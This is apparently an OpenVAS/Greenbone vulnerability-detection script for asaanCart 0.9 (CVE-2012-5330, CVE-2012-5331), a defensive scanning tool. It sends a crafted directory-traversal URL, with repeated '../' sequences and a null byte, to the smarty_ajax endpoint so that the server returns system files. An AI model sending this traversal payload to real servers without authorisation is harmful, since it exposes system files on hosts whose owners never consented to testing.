if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103590" );
	script_bugtraq_id( 52498 );
	script_cve_id( "CVE-2012-5330", "CVE-2012-5331" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "asaanCart Multiple Input Validation Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/52498" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-10-23 11:48:15 +0200 (Tue, 23 Oct 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "asaanCart is prone to multiple input-validation vulnerabilities,
including:

1. Multiple HTML-injection vulnerabilities

2. A local file-include vulnerability

3. A cross-site scripting vulnerability" );
	script_tag( name: "impact", value: "Exploiting these issues could allow an attacker to execute arbitrary
script code in the browser, steal cookie-based authentication
credentials, control how the site is rendered to the user, view files,
and execute local scripts." );
	script_tag( name: "affected", value: "asaanCart 0.9 is vulnerable, other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of
this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/asaancart", "/shop", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for file in keys( files ) {
		url = dir + "/libs/smarty_ajax/index.php?_=&f=update_intro&page=" + crap( data: "../", length: 9 * 6 ) + files[file] + "%00";
		if(http_vuln_check( port: port, url: url, pattern: file )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

